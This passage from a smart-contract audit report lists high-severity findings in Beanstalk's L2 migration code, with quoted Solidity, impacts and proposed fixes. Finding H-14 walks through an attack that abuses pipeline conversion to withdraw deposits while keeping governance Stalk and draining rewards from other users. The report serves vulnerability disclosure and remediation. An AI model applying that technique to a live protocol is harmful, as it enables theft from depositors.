        verifySignature(owner, reciever, deadline, signature);

        // set deposits for `reciever`.
        uint256 accountStalk;
        for (uint256 i; i < deposits.length; i++) {
            accountStalk += addMigratedDepositsToAccount(reciever, deposits[i]);
        }

        // set stalk for account.
        setStalk(reciever, accountStalk, ownerRoots);
    }
```

However, the internal balances are actually never credited.

## Impact
Loss of internal balances

## Tools Used
Manual review

## Recommendations
Migrate the internal balances
## <a id='H-07'></a>H-07. L2ContractMigrationFacet doesn't increase total Stalk and Roots

_Submitted by [T1MOH](https://profiles.cyfrin.io/u/undefined), [deadrosesxyz](https://profiles.cyfrin.io/u/undefined). Selected submission by: [T1MOH](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

L2ContractMigrationFacet is used to migrate deposits owned by smart contracts.

Problem is that it increases balance of Stalk and Roots associated with migrated deposit, but never updates global balances of Stalk in Roots in Silo.

## Vulnerability Details

As you can see it increases only account's balance but never updates global balances during migration
<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/df2dd129a878d16d4adc75049179ac0029d9a96b/protocol/contracts/beanstalk/silo/L2ContractMigrationFacet.sol#L205-L211>

```solidity
    function setStalk(address account, uint256 accountStalk, uint256 accountRoots) internal {
        s.accts[account].stalk += accountStalk;
        s.accts[account].roots += accountRoots;

        // emit event.
        emit StalkBalanceChanged(account, int256(accountStalk), int256(accountRoots));
    }
```

## Impact

Core invariant `totalBalance = Sum(userIndividualBalances)` for both Roots and Stalk is broken.

It causes incorrect calculations in all the functions where `s.sys.silo.roots` and `s.sys.silo.stalk` are used. Such as:

1. `LibSilo.mintActiveStalk()` - incorrect amount of Stalk and Roots is minted for all new deposits.
2. `LibSilo.burnActiveStalk()` - incorrect amount of Stalk and Roots is burned in all withdrawals.
3. `LibSilo.transferStalk()` - incorrect amount of Stalk and Roots is transferred in all transfers.

## Tools Used

Manual Review

## Recommendations

Increase global balances `s.sys.silo.stalk` and `s.sys.silo.roots` in `L2ContractMigrationFacet.setStalk()`

## <a id='H-08'></a>H-08. User's stalk is overwritten instead of increased within `ReseedSilo`

_Submitted by [T1MOH](https://profiles.cyfrin.io/u/undefined), [deadrosesxyz](https://profiles.cyfrin.io/u/undefined). Selected submission by: [deadrosesxyz](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

User's stalk is overwritten instead of increased within `ReseedSilo`

## Vulnerability Details

Most user deposits will be migrated via `ReseedSilo`. Currently, it calculates user's stalk and sets the account's value to it

```solidity
            // increment stalkForAccount by the stalk issued per BDV.
            // placed outside of loop for gas effiency.
            accountStalk += stalkIssuedPerBdv * totalBdvForAccount;

            // set stalk for account.
            s.accts[deposits.accounts].stalk = accountStalk;
        }
```

Although the function will be called only once upon deployment (with the deployment script), it is called for 6 different tokens

```solidity
    function init(
        SiloDeposits calldata beanDeposits,
        SiloDeposits calldata beanEthDeposits,
        SiloDeposits calldata beanWstEthDeposits,
        SiloDeposits calldata bean3CrvDeposits,
        SiloDeposits calldata urBeanDeposits,
        SiloDeposits calldata urBeanLpDeposits
    ) external {
        // initialize beanDeposits.
        reseedSiloDeposit(beanDeposits);

        // initialize beanEthDeposits.
        reseedSiloDeposit(beanEthDeposits);

        // initialize beanWstEthDeposits.
        reseedSiloDeposit(beanWstEthDeposits);

        // initialize beanStableDeposits.
        reseedSiloDeposit(bean3CrvDeposits);

        // initialize urBeanDeposits.
        reseedSiloDeposit(urBeanDeposits);

        // initialize urBeanLpDeposits.
        reseedSiloDeposit(urBeanLpDeposits);
    }
```

Meaning that if any user has deposits in more than one of them, their stalk will get overwritten with the one of their latest migrated deposit.

## Impact

Loss of stalk

## Tools Used

Manual review

## Recommendations

Increase instead of overwrite

## <a id='H-09'></a>H-09. Grown Stalk is incorrectly calculated in ReseedSilo

_Submitted by [T1MOH](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

ReseedSilo migrates Silo deposits. It calculates stalk associated with deposits' owner by combining 2 types of Stalk: reward Stalk and Stalk issued during deposit.

Problem is that during reward Stalk calculation it overestimates actual amount by 1e6 times.

## Vulnerability Details

Here you can see in ReseedSilo it multiplies stem delta and BDV:
<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/df2dd129a878d16d4adc75049179ac0029d9a96b/protocol/contracts/beanstalk/init/reseed/L2/ReseedSilo.sol#L132>

```solidity
                accountStalk += uint96(siloDeposit.stemTip - stem) * deposits.dd[j].bdv;
```

However stem already represents Stalk amount issued per BDV, i.e. per 1e6 BDV. For example if stem delta is 5.4e6 and BDV is 10e6, it should calculate 54e6 Stalk.

You can find correct implementation in old part of Beanstalk:
<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/df2dd129a878d16d4adc75049179ac0029d9a96b/protocol/contracts/libraries/Silo/LibSilo.sol#L650-L669>

```solidity
    function stalkReward(
        int96 startStem,
        int96 endStem,
        uint128 bdv
    ) internal pure returns (uint256) {
        uint128 reward = uint128(uint96(endStem.sub(startStem))).mul(bdv).div(PRECISION);

        return reward;
    }
```

## Impact

ReseedSilo overestimates migrated Stalk by 1e6 times. It means new deposits will give too low Stalk compared to migrated, it completely breaks governance because Stalk is governance token.

Additionally migrated deposits will steal all the Beans from new depositors distributed to Silo at the start of the season

## Tools Used

Manual Review

## Recommendations

```diff
-               accountStalk += uint96(siloDeposit.stemTip - stem) * deposits.dd[j].bdv;
+               accountStalk += uint96(siloDeposit.stemTip - stem) * deposits.dd[j].bdv / 1e6;
```

## <a id='H-10'></a>H-10. L2ContractMigrationFacet migrates incorrect amount of Stalk

_Submitted by [T1MOH](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

L2ContractMigrationFacet is used to migrate Silo deposits owned by smart contracts. During migration it calculates grown Stalk associated with deposits. Problem is that wrong precision is used in that calculation.

## Vulnerability Details

Here you can see that it just multiplies stem delta and BDV:

```solidity
    function addMigratedDepositsToAccount(
        address account,
        AccountDepositData calldata depositData
    ) internal returns (uint256 accountStalk) {
        ...
        for (uint256 i; i < depositData.depositIds.length; i++) {
            ...

            // increment by grown stalk of deposit.
@>          accountStalk += uint96(stemTip - stem) * depositData.bdvs[i];

            ...
        }

        ...
    }
```

However correct way to calculate grown Stalk is defined in `LibSilo.stalkReward()`, i.e. it must divide result by 1e6:
<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/df2dd129a878d16d4adc75049179ac0029d9a96b/protocol/contracts/libraries/Silo/LibSilo.sol#L650-L669>

```solidity
    /**
     * @notice Calculates the Stalk reward based on the start and end
     * stems, and the amount of BDV deposited. Stems represent the
     * amount of grown stalk per BDV, so the difference between the
     * start index and end index (stem) multiplied by the amount of
     * bdv deposited will give the amount of stalk earned.
     * formula: stalk = bdv * (ΔstalkPerBdv)
     *
     * @dev endStem must be larger than startStem.
     *
     */
    function stalkReward(
        int96 startStem,
        int96 endStem,
        uint128 bdv
    ) internal pure returns (uint256) {
        uint128 reward = uint128(uint96(endStem.sub(startStem))).mul(bdv).div(PRECISION);

        return reward;
    }
```

## Impact

Grown Stalk associated with migrated deposits owned by smart contracts will be calculated incorrectly, i.e. it overestimates actual Stalk by 1e6 times. Stalk is governance token, hence governance will be compromised.

Additionally migrated deposits will receive much higher amount of Roots, unintentionally stealing it from new depositors. New depositors will receive dust amount of Roots.

## Tools Used

Manual Review

## Recommendations

```diff
    function addMigratedDepositsToAccount(
        address account,
        AccountDepositData calldata depositData
    ) internal returns (uint256 accountStalk) {
        ...
        for (uint256 i; i < depositData.depositIds.length; i++) {
            ...

            // increment by grown stalk of deposit.
-           accountStalk += uint96(stemTip - stem) * depositData.bdvs[i];
+           accountStalk += LibSilo.stalkReward(stem, siloDeposit.stemTip, deposits.dd[j].bdv);

            ...
        }

        ...
    }
```

## <a id='H-11'></a>H-11. `L2ContractMigrationFacet.addMigratedDepositsToAccount()` doesn't update some global balances during the migration.

_Submitted by [0xBeastBoy](https://profiles.cyfrin.io/u/undefined), [T1MOH](https://profiles.cyfrin.io/u/undefined), [deadrosesxyz](https://profiles.cyfrin.io/u/undefined), [bladesec](https://profiles.cyfrin.io/u/undefined), [OxTenma](https://profiles.cyfrin.io/u/undefined), [psb01](https://profiles.cyfrin.io/u/undefined), [seraviz](https://profiles.cyfrin.io/u/undefined). Selected submission by: [bladesec](https://profiles.cyfrin.io/u/undefined)._      
            


## Github link

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/9c7b9fd521ad7cbe65cc788df181887c0eb39c6d/protocol/contracts/beanstalk/silo/L2ContractMigrationFacet.sol#L194>

## Summary

While migrating deposits to L2, `addMigratedDepositsToAccount()` doesn't increase the global `deposited` and `depositedBdv` balances.

## Vulnerability Details

Users can redeem their deposits and internal balances on L2 using `redeemDepositsAndInternalBalances()`.

And `redeemDepositsAndInternalBalances()` calls [addMigratedDepositsToAccount()](https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/9c7b9fd521ad7cbe65cc788df181887c0eb39c6d/protocol/contracts/beanstalk/silo/L2ContractMigrationFacet.sol#L109) to manage each deposit.

But in `addMigratedDepositsToAccount()`, it doesn't track `totalDeposited` and `totalDepositedBdv` at all.

```solidity
    function addMigratedDepositsToAccount(
        address account,
        AccountDepositData calldata depositData
    ) internal returns (uint256 accountStalk) {
        int96 stemTip = LibTokenSilo.stemTipForToken(depositData.token);
        uint256 stalkIssuedPerBdv = s.sys.silo.assetSettings[depositData.token].stalkIssuedPerBdv;
        uint128 totalBdvForAccount;
        uint128 totalDeposited;
        uint128 totalDepositedBdv;
        for (uint256 i; i < depositData.depositIds.length; i++) {
            // verify that depositId is valid.
            uint256 depositId = depositData.depositIds[i];
            (address depositToken, int96 stem) = depositId.unpackAddressAndStem();
            require(depositToken == depositData.token, "Migration: INVALID_DEPOSIT_ID");
            require(stemTip >= stem, "Migration: INVALID_STEM");

            // add deposit to account.
            s.accts[account].deposits[depositId].amount = depositData.amounts[i];
            s.accts[account].deposits[depositId].bdv = depositData.bdvs[i];

            // increment totalBdvForAccount by bdv of deposit:
            totalBdvForAccount += depositData.bdvs[i];

            // increment by grown stalk of deposit.
            accountStalk += uint96(stemTip - stem) * depositData.bdvs[i];

            // emit events.
            emit AddDeposit(
                account,
                depositData.token,
                stem,
                depositData.amounts[i],
                depositData.bdvs[i]
            );
            emit TransferSingle(msg.sender, address(0), account, depositId, depositData.amounts[i]);
        }

        // update mowStatuses for account and token.
        s.accts[account].mowStatuses[depositData.token].bdv = totalBdvForAccount;
        s.accts[account].mowStatuses[depositData.token].lastStem = stemTip;

        // set global state
        s.sys.silo.balances[depositData.token].deposited = totalDeposited; //@audit wrong amount
        s.sys.silo.balances[depositData.token].depositedBdv = totalDepositedBdv; //@audit wrong amount

        // increment stalkForAccount by the stalk issued per BDV.
        // placed outside of loop for gas effiency.
        accountStalk += stalkIssuedPerBdv * totalBdvForAccount;
    }
```

So the global `deposited` and `depositedBdv` won't be increased after the migration.

These global balances are used in several logics like the token withdrawal validation and gauge points calculations.

As an example, these balances are decreased during [a withdrawal](https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/9c7b9fd521ad7cbe65cc788df181887c0eb39c6d/protocol/contracts/beanstalk/silo/SiloFacet/TokenSilo.sol#L299) and some withdrawals would [revert due to underflow](https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/9c7b9fd521ad7cbe65cc788df181887c0eb39c6d/protocol/contracts/libraries/Silo/LibTokenSilo.sol#L206) as these global balances are less than the total balances of all users.

## Impact

Several logics with the withdrawal wouldn't work properly with the wrong global balances.

## Tools Used

Manual Review

## Recommendations

We should increase the global balances in `addMigratedDepositsToAccount()`.

```diff
    function addMigratedDepositsToAccount(
        address account,
        AccountDepositData calldata depositData
    ) internal returns (uint256 accountStalk) {
        int96 stemTip = LibTokenSilo.stemTipForToken(depositData.token);
        uint256 stalkIssuedPerBdv = s.sys.silo.assetSettings[depositData.token].stalkIssuedPerBdv;
        uint128 totalBdvForAccount;
        uint128 totalDeposited;
        uint128 totalDepositedBdv;
        for (uint256 i; i < depositData.depositIds.length; i++) {
            // verify that depositId is valid.
            uint256 depositId = depositData.depositIds[i];
            (address depositToken, int96 stem) = depositId.unpackAddressAndStem();
            require(depositToken == depositData.token, "Migration: INVALID_DEPOSIT_ID");
            require(stemTip >= stem, "Migration: INVALID_STEM");

            // add deposit to account.
            s.accts[account].deposits[depositId].amount = depositData.amounts[i];
            s.accts[account].deposits[depositId].bdv = depositData.bdvs[i];

+           totalDeposited += depositData.amounts[i];
+           totalDepositedBdv += depositData.bdvs[i];

            // increment totalBdvForAccount by bdv of deposit:
            totalBdvForAccount += depositData.bdvs[i];

            // increment by grown stalk of deposit.
            accountStalk += uint96(stemTip - stem) * depositData.bdvs[i];

            // emit events.
            emit AddDeposit(
                account,
                depositData.token,
                stem,
                depositData.amounts[i],
                depositData.bdvs[i]
            );
            emit TransferSingle(msg.sender, address(0), account, depositId, depositData.amounts[i]);
        }

        // update mowStatuses for account and token.
        s.accts[account].mowStatuses[depositData.token].bdv = totalBdvForAccount;
        s.accts[account].mowStatuses[depositData.token].lastStem = stemTip;

        // set global state
-        s.sys.silo.balances[depositData.token].deposited = totalDeposited;
-        s.sys.silo.balances[depositData.token].depositedBdv = totalDepositedBdv;

+        s.sys.silo.balances[depositData.token].deposited = totalDeposited;
+        s.sys.silo.balances[depositData.token].depositedBdv = totalDepositedBdv;

        // increment stalkForAccount by the stalk issued per BDV.
        // placed outside of loop for gas effiency.
        accountStalk += stalkIssuedPerBdv * totalBdvForAccount;
    }
```

## <a id='H-12'></a>H-12. Possible loss of user's balances after calling `addMigratedDepositsToAccount()`.

_Submitted by [T1MOH](https://profiles.cyfrin.io/u/undefined), [deadrosesxyz](https://profiles.cyfrin.io/u/undefined), [bladesec](https://profiles.cyfrin.io/u/undefined). Selected submission by: [bladesec](https://profiles.cyfrin.io/u/undefined)._      
            


## Github link

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/9c7b9fd521ad7cbe65cc788df181887c0eb39c6d/protocol/contracts/beanstalk/silo/L2ContractMigrationFacet.sol#L169-L170>

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/9c7b9fd521ad7cbe65cc788df181887c0eb39c6d/protocol/contracts/beanstalk/silo/L2ContractMigrationFacet.sol#L190-L191>

## Summary

While migrating deposits to L2, `addMigratedDepositsToAccount()` doesn't accumulate the user's balances properly.

## Vulnerability Details

Users can redeem their deposits and internal balances on L2 using `redeemDepositsAndInternalBalances()`.

And `redeemDepositsAndInternalBalances()` calls [addMigratedDepositsToAccount()](https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/9c7b9fd521ad7cbe65cc788df181887c0eb39c6d/protocol/contracts/beanstalk/silo/L2ContractMigrationFacet.sol#L109) to manage each deposit.

But in `addMigratedDepositsToAccount()`, it just overwrites the user's balances and status without considering already existing amounts.

```solidity
    function addMigratedDepositsToAccount(
        address account,
        AccountDepositData calldata depositData
    ) internal returns (uint256 accountStalk) {
        int96 stemTip = LibTokenSilo.stemTipForToken(depositData.token);
        uint256 stalkIssuedPerBdv = s.sys.silo.assetSettings[depositData.token].stalkIssuedPerBdv;
        uint128 totalBdvForAccount;
        uint128 totalDeposited;
        uint128 totalDepositedBdv;
        for (uint256 i; i < depositData.depositIds.length; i++) {
            // verify that depositId is valid.
            uint256 depositId = depositData.depositIds[i];
            (address depositToken, int96 stem) = depositId.unpackAddressAndStem();
            require(depositToken == depositData.token, "Migration: INVALID_DEPOSIT_ID");
            require(stemTip >= stem, "Migration: INVALID_STEM");

            // add deposit to account.
            s.accts[account].deposits[depositId].amount = depositData.amounts[i]; //@audit overwrite
            s.accts[account].deposits[depositId].bdv = depositData.bdvs[i]; //@audit overwrite

            // increment totalBdvForAccount by bdv of deposit:
            totalBdvForAccount += depositData.bdvs[i];

            // increment by grown stalk of deposit.
            accountStalk += uint96(stemTip - stem) * depositData.bdvs[i];

            // emit events.
            emit AddDeposit(
                account,
                depositData.token,
                stem,
                depositData.amounts[i],
                depositData.bdvs[i]
            );
            emit TransferSingle(msg.sender, address(0), account, depositId, depositData.amounts[i]);
        }

        // update mowStatuses for account and token.
        s.accts[account].mowStatuses[depositData.token].bdv = totalBdvForAccount; //@audit overwrite
        s.accts[account].mowStatuses[depositData.token].lastStem = stemTip; //@audit overwrite

        // set global state
        s.sys.silo.balances[depositData.token].deposited = totalDeposited;
        s.sys.silo.balances[depositData.token].depositedBdv = totalDepositedBdv;

        // increment stalkForAccount by the stalk issued per BDV.
        // placed outside of loop for gas effiency.
        accountStalk += stalkIssuedPerBdv * totalBdvForAccount;
    }
```

So if a user has positve balances before the migration or multiple migrations are executed for the same receiver, user balances will be overwritten and the previous state will be lost.

## Impact

Users might lose some balances after migrating to L2.

## Tools Used

Manual Review

## Recommendations

`addMigratedDepositsToAccount()` should accmulate balances instead of overwriting.

```diff
    function addMigratedDepositsToAccount(
        address account,
        AccountDepositData calldata depositData
    ) internal returns (uint256 accountStalk) {
        int96 stemTip = LibTokenSilo.stemTipForToken(depositData.token);
        uint256 stalkIssuedPerBdv = s.sys.silo.assetSettings[depositData.token].stalkIssuedPerBdv;
        uint128 totalBdvForAccount;
        uint128 totalDeposited;
        uint128 totalDepositedBdv;
        for (uint256 i; i < depositData.depositIds.length; i++) {
            // verify that depositId is valid.
            uint256 depositId = depositData.depositIds[i];
            (address depositToken, int96 stem) = depositId.unpackAddressAndStem();
            require(depositToken == depositData.token, "Migration: INVALID_DEPOSIT_ID");
            require(stemTip >= stem, "Migration: INVALID_STEM");

            // add deposit to account.
-            s.accts[account].deposits[depositId].amount = depositData.amounts[i];
-            s.accts[account].deposits[depositId].bdv = depositData.bdvs[i];

+            s.accts[account].deposits[depositId].amount += depositData.amounts[i];
+            s.accts[account].deposits[depositId].bdv += depositData.bdvs[i];

            // increment totalBdvForAccount by bdv of deposit:
            totalBdvForAccount += depositData.bdvs[i];

            // increment by grown stalk of deposit.
            accountStalk += uint96(stemTip - stem) * depositData.bdvs[i];

            // emit events.
            emit AddDeposit(
                account,
                depositData.token,
                stem,
                depositData.amounts[i],
                depositData.bdvs[i]
            );
            emit TransferSingle(msg.sender, address(0), account, depositId, depositData.amounts[i]);
        }

        // update mowStatuses for account and token.
-        s.accts[account].mowStatuses[depositData.token].bdv = totalBdvForAccount;
-        s.accts[account].mowStatuses[depositData.token].lastStem = stemTip;

+        s.accts[account].mowStatuses[depositData.token].bdv = totalBdvForAccount;
+        s.accts[account].mowStatuses[depositData.token].lastStem = stemTip;

        // set global state
        s.sys.silo.balances[depositData.token].deposited = totalDeposited;
        s.sys.silo.balances[depositData.token].depositedBdv = totalDepositedBdv;

        // increment stalkForAccount by the stalk issued per BDV.
        // placed outside of loop for gas effiency.
        accountStalk += stalkIssuedPerBdv * totalBdvForAccount;
    }
```

## <a id='H-13'></a>H-13. ReseedSilo doesn't update total balances of Stalk and Roots

_Submitted by [T1MOH](https://profiles.cyfrin.io/u/undefined), [deadrosesxyz](https://profiles.cyfrin.io/u/undefined). Selected submission by: [T1MOH](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

ReseedSilo is used to migrate Silo deposits owned by EOA. It writes Stalk associated with migrated deposits and misses to write Roots (but that's another issue submitted in another report). However it doesn't update total supply

## Vulnerability Details

As you can see this function doesn't increase global values of `s.sys.silo.stalk` and `s.sys.silo.roots`:
<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/df2dd129a878d16d4adc75049179ac0029d9a96b/protocol/contracts/beanstalk/init/reseed/L2/ReseedSilo.sol#L109-L180>

## Impact

As you can see after migration `s.sys.silo.stalk` will be much much lower. This value is used in Gauge Point system.

It is used to calculate `s.sys.seedGauge.averageGrownStalkPerBdvPerSeason`:
<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/df2dd129a878d16d4adc75049179ac0029d9a96b/protocol/contracts/libraries/LibGauge.sol#L343-L352>

```solidity
    function updateAverageStalkPerBdvPerSeason() internal {
        ...
@>      s.sys.seedGauge.averageGrownStalkPerBdvPerSeason = uint128(
@>          getAverageGrownStalkPerBdv().mul(BDV_PRECISION).div(
                s.sys.seedGaugeSettings.targetSeasonsToCatchUp
            )
        );
        ...
    }

    function getAverageGrownStalkPerBdv() internal view returns (uint256) {
        AppStorage storage s = LibAppStorage.diamondStorage();
        uint256 totalBdv = getTotalBdv();
        if (totalBdv == 0) return 0;
@>      return s.sys.silo.stalk.div(totalBdv).sub(STALK_BDV_PRECISION);
    }
```

Then `s.sys.seedGauge.averageGrownStalkPerBdvPerSeason` is used to calculate amount of Grown Stalk for the next season:
<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/df2dd129a878d16d4adc75049179ac0029d9a96b/protocol/contracts/libraries/LibGauge.sol#L267-L269>

```solidity
    function updateGrownStalkEarnedPerSeason(
        uint256 maxLpGpPerBdv,
        LpGaugePointData[] memory lpGpData,
        uint256 totalGaugePoints,
        uint256 totalLpBdv
    ) internal {
        ...

        // update the average grown stalk per BDV per Season.
        // beanstalk must exist for a minimum of the catchup season in order to update the average.
        if (s.sys.season.current > s.sys.seedGaugeSettings.targetSeasonsToCatchUp) {
@>          updateAverageStalkPerBdvPerSeason();
        }

        // Calculate grown stalk issued this season and GrownStalk Per GaugePoint.
@>      uint256 newGrownStalk = uint256(s.sys.seedGauge.averageGrownStalkPerBdvPerSeason)
            .mul(totalGaugeBdv)
            .div(BDV_PRECISION);

        ...
    }
```

As you remember total Stalk is much lower than it should be, it means Stalk rewards in future seasons will be much lower too. It will lead to imbalance in voting because Stalk is governance token.

Additionally Stalk is associated with Roots. There will also be imbalance in distribution of Beans minted to Silo at the start of the season.

## Tools Used

Manual Review

## Recommendations

Here is solution to set Stalk. You should also increase global Roots.

```diff
    function reseedSiloDeposit(SiloDeposits calldata siloDeposit) internal {
        uint256 totalCalcDeposited;
        uint256 totalCalcDepositedBdv;
        uint256 stalkIssuedPerBdv = s.sys.silo.assetSettings[siloDeposit.token].stalkIssuedPerBdv;
+       uint256 totalStalk;
        for (uint256 i; i < siloDeposit.siloDepositsAccount.length; i++) {
            ...
            }
            ...

            // set stalk for account.
            s.accts[deposits.accounts].stalk = accountStalk;
            
+           totalStalk += accountStalk;
        }

        ...
        // set global state
        s.sys.silo.balances[siloDeposit.token].deposited = siloDeposit.totalDeposited;
        s.sys.silo.balances[siloDeposit.token].depositedBdv = siloDeposit.totalDepositedBdv;
+       s.sys.silo.stalk += totalStalk;
    }
```

## <a id='H-14'></a>H-14. `LibPipelineConvert.executePipelineConvert()` doesn't decrease Grown Stalk when BDV decreases

_Submitted by [T1MOH](https://profiles.cyfrin.io/u/undefined), [fyamf](https://profiles.cyfrin.io/u/undefined). Selected submission by: [T1MOH](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

Pipeline Convert is a way to convert Silo deposits from one token to another while not losing Grown Stalk and potentially increasing final BDV.

Problem is that it doesn't handle case where final BDV is less than before Pipeline Convert. Because of issue it doesn't decrease Grown Stalk.
It allows users to just withdraw part of their deposit without Grown Stalk penalty.

## Vulnerability Details

Let's take a look on `pipelineConvert()`. It:

1. Removes deposits from account
2. Execute Pipeline Convert logic
3. Creates deposits to account with certain BDV and Grown Stalk which are calculated inside step 2
   <https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/df2dd129a878d16d4adc75049179ac0029d9a96b/protocol/contracts/beanstalk/silo/PipelineConvertFacet.sol#L62-L110>

```solidity
    function pipelineConvert(
        address inputToken,
        int96[] calldata stems,
        uint256[] calldata amounts,
        address outputToken,
        AdvancedFarmCall[] calldata advancedFarmCalls
    )
        external
        payable
        fundsSafu
        nonReentrant
        returns (int96 toStem, uint256 fromAmount, uint256 toAmount, uint256 fromBdv, uint256 toBdv)
    {
        ...

        // withdraw tokens from deposits and calculate the total grown stalk and bdv.
        uint256 grownStalk;
@>      (grownStalk, fromBdv) = LibConvert._withdrawTokens(inputToken, stems, amounts, fromAmount);

@>      (toAmount, grownStalk, toBdv) = LibPipelineConvert.executePipelineConvert(
            inputToken,
            outputToken,
            fromAmount,
            fromBdv,
            grownStalk,
            advancedFarmCalls
        );

@>      toStem = LibConvert._depositTokensForConvert(outputToken, toAmount, toBdv, grownStalk);

        emit Convert(LibTractor._user(), inputToken, outputToken, fromAmount, toAmount);
    }
```

Let's dive into step 2. It performs AdvancedFarmCalls and applies penalty to `newGrownStalk` based on caps and deltaB disbalance.

```solidity
    function executePipelineConvert(
        address inputToken,
        address outputToken,
        uint256 fromAmount,
        uint256 fromBdv,
        uint256 initialGrownStalk,
        AdvancedFarmCall[] calldata advancedFarmCalls
    ) external returns (uint256 toAmount, uint256 newGrownStalk, uint256 newBdv) {
        ...

        IERC20(inputToken).transfer(C.PIPELINE, fromAmount);
        executeAdvancedFarmCalls(advancedFarmCalls);

        // user MUST leave final assets in pipeline, allowing us to verify that the farm has been called successfully.
        // this also let's us know how many assets to attempt to pull out of the final type
        toAmount = transferTokensFromPipeline(outputToken);

        // Calculate stalk penalty using start/finish deltaB of pools, and the capped deltaB is
        // passed in to setup max convert power.
        pipeData.stalkPenaltyBdv = prepareStalkPenaltyCalculation(...);

        // Update grownStalk amount with penalty applied
        newGrownStalk = (initialGrownStalk * (fromBdv - pipeData.stalkPenaltyBdv)) / fromBdv;

        newBdv = LibTokenSilo.beanDenominatedValue(outputToken, toAmount);
    }
```

And in step 3 it calculates new Stem based on Grown Stalk it should produce:
<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/df2dd129a878d16d4adc75049179ac0029d9a96b/protocol/contracts/libraries/Silo/LibTokenSilo.sol#L545-L555>

```solidity
    function calculateStemForTokenFromGrownStalk(
        address token,
        uint256 grownStalk,
        uint256 bdv
    ) internal view returns (int96 stem, GerminationSide side) {
        LibGerminate.GermStem memory germStem = LibGerminate.getGerminatingStem(token);
        stem = germStem.stemTip.sub(
            SafeCast.toInt96(SafeCast.toInt256(grownStalk.mul(PRECISION).div(bdv)))
        );
        side = LibGerminate._getGerminationState(stem, germStem);
    }
```

Finally here is attack vector:

1. Assume Attacker has Silo deposit of 100e6 Bean with Stem 4990e6. Current `stemTip = 5000e6`, it means his Grown Stalk is `(5000e6 - 4990e6) * 100e6 / 1e6 = 1000e6`
2. In AdvancedFarmCalls during PipelineConvert Attacker just withdraws 99e6 Beans (converts Bean to Bean). It can only slightly be penalised based on cap exceed, penalization doesn't matter so assume penalization doesn't happen
3. It calculates stem for deposit of 1e6 Bean so that it produced 1000e6 Stalk. As a result user has deposit of 1e6 Bean with `stem = 5000e6 - 1000e6 * 1e6 / 1e6 = 4000e6`.

As you can see his Grown Stalk was not decreased while user just performed withdrawal via PipelineConvert.

## Impact

Users can withdraw significant part of their deposit without losing Grown Stalk. And repeat it again and again. This allows to have big amount of Stalk without depositing much to Silo.

Such attacker will steal Roots from fair users without risk. That's because he can make huge deposit for little time to gain huge amount of Stalk and Roots, and then withdraw that huge deposit without Grown Stalk penalization (as far as convert cap allows it).

## Tools Used

Manual Review

## Recommendations

Decrease Grown Stalk proportionally to decrease of BDV:

```diff
    function executePipelineConvert(
        address inputToken,
        address outputToken,
        uint256 fromAmount,
        uint256 fromBdv,
        uint256 initialGrownStalk,
        AdvancedFarmCall[] calldata advancedFarmCalls
    ) external returns (uint256 toAmount, uint256 newGrownStalk, uint256 newBdv) {
        ...

-       // Update grownStalk amount with penalty applied
-       newGrownStalk = (initialGrownStalk * (fromBdv - pipeData.stalkPenaltyBdv)) / fromBdv;
-
-       newBdv = LibTokenSilo.beanDenominatedValue(outputToken, toAmount);

+       newBdv = LibTokenSilo.beanDenominatedValue(outputToken, toAmount);
+       // Update grownStalk amount with penalty applied
+       newGrownStalk = (initialGrownStalk * (fromBdv - pipeData.stalkPenaltyBdv)) / fromBdv;
+       if (newBdv < fromBdv) newGrownStalk = newGrownStalk * newBdv / fromBdv;
    }
```

## <a id='H-15'></a>H-15. ReseedBarn.sol doesn't initialize of `s.sys.fert.recapitalized`

_Submitted by [T1MOH](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

After migration to L2 Fertilizer module will incorrectly calculate amount of debt to repay because during migration it doesn't initialize variable which tracks amount of recapitalized debt.

As a result, it has several consequensec described below.

## Vulnerability Details

1st is that Fertilizer can be minted when debt is repaid because following line won't revert. Instead it will continue execution of Barn logic.
<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/df2dd129a878d16d4adc75049179ac0029d9a96b/protocol/contracts/libraries/LibFertilizer.sol#L92>

```solidity
    function addUnderlying(
        uint256 tokenAmountIn,
        uint256 usdAmount,
        uint256 minAmountOut
    ) internal {
        AppStorage storage s = LibAppStorage.diamondStorage();
        // Calculate how many new Deposited Beans will be minted
@>      uint256 percentToFill = usdAmount.mul(C.precision()).div(remainingRecapitalization());

        ...
    }
```

2ns is that Unripe Convert works incorrectly because of incorrect calculation of conversion between UnripeLP and UnripeBean, perticularly it inflates ratio LP/Bean.
`LibUnripe.percentLPRecapped()` is used to calculate ratio between UnripeLP and UnripeBean. And as you can see it will overestimate price LP/Bean because `LibUnripe.percentLPRecapped()` returns much lower result than expected.
<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/df2dd129a878d16d4adc75049179ac0029d9a96b/protocol/contracts/libraries/LibUnripe.sol#L42-L45>

```solidity
    function percentLPRecapped() internal view returns (uint256 percent) {
        AppStorage storage s = LibAppStorage.diamondStorage();
        return C.unripeLPPerDollar().mul(s.sys.fert.recapitalized).div(C.unripeLP().totalSupply());
    }
```

This function is used in the core logic of Unripe Convert:
<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/df2dd129a878d16d4adc75049179ac0029d9a96b/protocol/contracts/libraries/Convert/LibUnripeConvert.sol#L21-L77>

```solidity
    function convertLPToBeans(
        bytes memory convertData
